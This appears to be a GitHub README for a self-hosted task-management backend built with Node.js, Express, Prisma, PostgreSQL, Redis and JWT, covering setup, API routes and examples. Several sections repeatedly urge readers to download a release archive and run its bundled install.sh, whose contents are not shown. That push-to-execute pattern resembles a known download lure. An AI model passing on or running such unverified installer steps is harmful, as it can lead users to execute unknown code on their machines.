# TaskFlow Platform — Modern Task Management with JWT and Realtime

[![Releases - Download](https://img.shields.io/badge/Releases-Download-blue.svg)](https://github.com/gokugoku222/taskflow-platform/releases)

![Productivity hero image](https://images.unsplash.com/photo-1522202176988-66273c2fd55f?q=80&w=1200&auto=format&fit=crop)

TaskFlow Platform is a production-ready task management server and client. It uses JWT for auth, a REST API, PostgreSQL for storage, Redis for realtime events, and Prisma as the ORM. The backend uses Node.js, Express, and TypeScript. The repo includes Docker setup, comprehensive tests with Jest, and a deployable architecture.

Badges
- [![Build Status](https://img.shields.io/github/actions/workflow/status/gokugoku222/taskflow-platform/ci.yml?branch=main)](https://github.com/gokugoku222/taskflow-platform/actions)
- [![Tests](https://img.shields.io/badge/tests-Jest-blue.svg)](https://github.com/gokugoku222/taskflow-platform/actions)
- [![License](https://img.shields.io/badge/license-MIT-green.svg)](https://github.com/gokugoku222/taskflow-platform/blob/main/LICENSE)
- [![Docker](https://img.shields.io/badge/docker-supported-blue.svg)](https://hub.docker.com)
- [![Releases - Download](https://img.shields.io/badge/Releases-Download-blue.svg)](https://github.com/gokugoku222/taskflow-platform/releases)

Quick links
- Releases: https://github.com/gokugoku222/taskflow-platform/releases — download the release asset and execute the included installer script (for example, download taskflow-platform-vX.Y.Z.tar.gz and run ./install.sh).
- Code: src/ (backend and client)
- Docs: docs/

Key features
- JWT-based authentication with refresh tokens
- RESTful API for tasks, projects, users, and comments
- Real-time sync using WebSocket + Redis pub/sub
- PostgreSQL with Prisma ORM and migration scripts
- Docker Compose for local dev and production
- TypeScript across backend and client
- End-to-end tests and unit tests with Jest
- Modular, production-oriented architecture

Who this fits
- Teams that need a self-hosted task system
- Developers building custom integrations
- Companies that require audit logs and role-based access
- Projects that need realtime updates across clients

Tech stack
- Node.js + TypeScript
- Express.js for HTTP API
- Prisma ORM for PostgreSQL
- PostgreSQL as primary DB
- Redis for realtime and caching
- WebSocket (ws) for real-time channels
- Docker and Docker Compose
- Jest for unit and integration tests
- React for the example client (monorepo layout)

Getting started (local dev)

1) Clone
```bash
git clone https://github.com/gokugoku222/taskflow-platform.git
cd taskflow-platform
```

2) Copy env
```bash
cp .env.example .env
```

3) Start required services with Docker Compose
```bash
docker compose up -d
# Wait for Postgres and Redis to be ready
```

4) Install dependencies
```bash
# backend
cd packages/backend
pnpm install

# client (optional)
cd ../client
pnpm install
```

5) Run database migrations and seeds
```bash
cd packages/backend
pnpm prisma migrate deploy
pnpm prisma db seed
```

6) Start the server
```bash
pnpm dev
# Server runs at http://localhost:4000
```

Environment variables (core)
- DATABASE_URL: postgres://user:pass@postgres:5432/taskflow
- REDIS_URL: redis://redis:6379
- JWT_SECRET: secure random secret
- JWT_REFRESH_SECRET: secure random refresh secret
- PORT: 4000
- NODE_ENV: development | production

Docker (production)

- Build and run images with the provided Dockerfiles and Docker Compose production file.

Example:
```bash
docker compose -f docker-compose.prod.yml up -d --build
```

Release download and execution
- Visit Releases: https://github.com/gokugoku222/taskflow-platform/releases
- Download the installer asset for your platform (for example taskflow-platform-vX.Y.Z-linux.tar.gz).
- Extract and run the provided installer or binary:
```bash
tar xzf taskflow-platform-vX.Y.Z-linux.tar.gz
cd taskflow-platform
./install.sh
```
The installer will create a default .env, apply migrations, and start the service under systemd or Docker, depending on the asset.

API overview

Base URL
- http://localhost:4000/api/v1

Auth
- POST /auth/register
  - Body: { email, password, name }
  - Returns access token and refresh token
- POST /auth/login
  - Body: { email, password }
  - Returns JWT access token and refresh token
- POST /auth/refresh
  - Body: { refreshToken }
  - Returns new access token

Tasks
- GET /tasks
  - Query: projectId, assignedTo, status, page, limit
- GET /tasks/:id
- POST /tasks
  - Body: { title, description, projectId, assigneeId, dueDate, status }
- PATCH /tasks/:id
  - Body: partial task fields
- DELETE /tasks/:id

Projects
- GET /projects
- POST /projects
- PATCH /projects/:id

Realtime (WebSocket)
- Connect to ws://localhost:4000/realtime with the header Authorization: Bearer <token>
- Subscribe to channels:
  - task:taskId
  - project:projectId
- Emit events:
  - task.updated
  - task.comment.created
- Server publishes updates to Redis. Multiple backend instances sync via pub/sub.

Database & Prisma

Prisma schema (excerpt)
```prisma
model User {
  id        String   @id @default(cuid())
  email     String   @unique
  password  String
  name      String?
  role      Role     @default(USER)
  createdAt DateTime @default(now())
  tasks     Task[]   @relation("Assignee")
}

model Project {
  id        String   @id @default(cuid())
  name      String
  ownerId   String
  owner     User     @relation(fields: [ownerId], references: [id])
  tasks     Task[]
  createdAt DateTime @default(now())
}

model Task {
  id          String    @id @default(cuid())
  title       String
  description String?
  status      TaskStatus @default(OPEN)
  assigneeId  String?
  assignee    User?     @relation("Assignee", fields: [assigneeId], references: [id])
  projectId   String
  project     Project   @relation(fields: [projectId], references: [id])
  dueDate     DateTime?
  createdAt   DateTime  @default(now())
}
```

Migrations
- Use prisma migrate for schema changes
```bash
pnpm prisma migrate dev --name add-field
pnpm prisma migrate deploy
```

Testing

- Unit tests: Jest with ts-jest
- Integration tests: use test containers (Postgres + Redis) or Docker Compose
- E2E: scriptable test runner that boots the server and client

Run all tests
```bash
pnpm test
```

CI
- The repo includes GitHub Actions workflow for linting, type checks, tests, and build.
- The pipeline runs on push and PR to main.

Security and auth model
- Access tokens: short-lived JWT (expires in minutes)
- Refresh tokens: stored hashed in DB, rotate on use
- Passwords: bcrypt
- RBAC: roles include ADMIN, MEMBER, GUEST. Middleware enforces permissions on routes.

Observability
- Structured logs (JSON) with timestamps
- Health endpoints:
  - GET /health (returns DB and Redis status)
- Metrics:
  - Prometheus metrics endpoint at /metrics (optional)

Client (example React app)
- The monorepo includes a sample React app that shows projects and tasks
- It uses the API and WebSocket for realtime updates
- Auth flow uses localStorage for access token and httpOnly cookie for refresh token in production

Monorepo layout
- packages/
  - backend/
  - client/
  - shared/ (types and utils)
- scripts/
  - dev helpers and deployment scripts
- docker/
  - compose files and production manifests

Contributing
- Open issues for new features or bugs
- Follow the branch strategy:
  - main: stable releases
  - develop: next release work
  - feature/*: feature branches
- Write tests for new features
- Run lint and type checks before PR

Examples

Register and create a task
```bash
curl -X POST http://localhost:4000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"me@example.com","password":"S3cureP@ss","name":"Me"}'

curl -X POST http://localhost:4000/api/v1/tasks \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"title":"Write README","projectId":"proj_123"}'
```

WebSocket example (Node client)
```js
const WebSocket = require('ws')
const ws = new WebSocket('ws://localhost:4000/realtime', {
  headers: { Authorization: 'Bearer ' + process.env.TOKEN }
})
ws.on('open', () => ws.send(JSON.stringify({ type: 'subscribe', channel: 'project:proj_123' })))
ws.on('message', m => console.log('event', m.toString()))
```

Maintenance and operations
- Use database backups for Postgres
- Rotate JWT secrets and refresh tokens on key compromise
- Scale horizontally: multiple backend instances subscribe to Redis channels for realtime sync
- Use a process manager or Docker swarm / Kubernetes for production

Licensing
- MIT

Releases and downloads
- Visit Releases to get installable assets and changelogs:
  - https://github.com/gokugoku222/taskflow-platform/releases
- Download the release asset and execute the included installer script as described earlier. The release package names follow semantic versioning. Example:
  - taskflow-platform-v1.2.3-linux.tar.gz
  - After extract, run ./install.sh to install services and apply database migrations.

Contact and support
- Open an issue for bugs or feature requests
- Create PRs for code changes
- Tag maintainers in issues for urgent bugs

Read the docs in docs/ for deeper design, API reference, migration guides, and deployment recipes.

[Download Releases](https://github.com/gokugoku222/taskflow-platform/releases)